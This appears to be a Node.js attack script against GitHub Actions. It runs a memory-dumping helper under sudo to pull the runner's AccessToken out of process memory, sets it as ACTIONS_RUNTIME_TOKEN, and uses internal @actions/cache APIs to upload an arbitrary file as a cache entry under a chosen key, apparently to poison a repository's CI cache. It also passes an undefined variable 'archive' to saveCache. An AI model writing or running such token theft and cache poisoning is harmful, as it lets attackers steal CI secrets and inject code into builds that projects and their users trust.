const transfilepath = process.argv[2];
const key = process.argv[3];
const version = crypto.randomBytes(32).toString('hex');

import * as cache from "@actions/cache";
const { execSync } = await import("child_process");
import * as fs from 'fs';
import * as crypto from 'crypto';

import { pathToFileURL } from 'node:url';
import path from 'node:path';

const toFileUrl = (relPath) =>
  pathToFileURL(path.resolve(process.cwd(), relPath)).href;

const {
  FinalizeCacheEntryUploadRequest,
  FinalizeCacheEntryUploadResponse,
  CreateCacheEntryRequest,
  GetCacheEntryDownloadURLRequest
} = await import(toFileUrl('node_modules/@actions/cache/lib/generated/results/api/v1/cache.js'));

const {
  UploadOptions,
  DownloadOptions
} = await import(toFileUrl('node_modules/@actions/cache/lib/options.js'));

const cacheTwirpClient = await import(
  toFileUrl('node_modules/@actions/cache/lib/internal/shared/cacheTwirpClient.js')
);

const cacheHttpClient = await import(
  toFileUrl('node_modules/@actions/cache/lib/internal/cacheHttpClient.js')
);

const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
const token = memtext.match(/AccessToken"\s*:\s*"([^"]+)"/)?.[1];

process.env.ACTIONS_RUNTIME_TOKEN = token;
process.env.ACTIONS_RESULTS_URL = "https://results-receiver.actions.githubusercontent.com/";
process.env.ACTIONS_CACHE_SERVICE_V2 = true;



try {
    const stats = fs.statSync(transfilepath);
    const archiveFileSize = stats.size;
    const request = { key, version };
    const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
    const response = await twirpClient.CreateCacheEntry(request);
    const options = { useAzureSdk: true };
    console.log(response);
    if (response.ok) {
        await cacheHttpClient.saveCache(-1, archive, response.signedUploadUrl, options);
        console.log('Cache entry created successfully:', response);
        const finalizeRequest = { key, version, sizeBytes: `${archiveFileSize}` };
        const finalizeResponse = await twirpClient.FinalizeCacheEntryUpload(finalizeRequest);
        if (finalizeResponse.ok) {
            console.log('Cache entry finalized successfully!');
        } else {
            console.error('Error finalizing cache entry');
        }
    } else {
        console.log('Error saving cache entry:', response.status, response.statusText);
    }
} catch (error) {
    console.error('Error setting cache entry:', error);
}
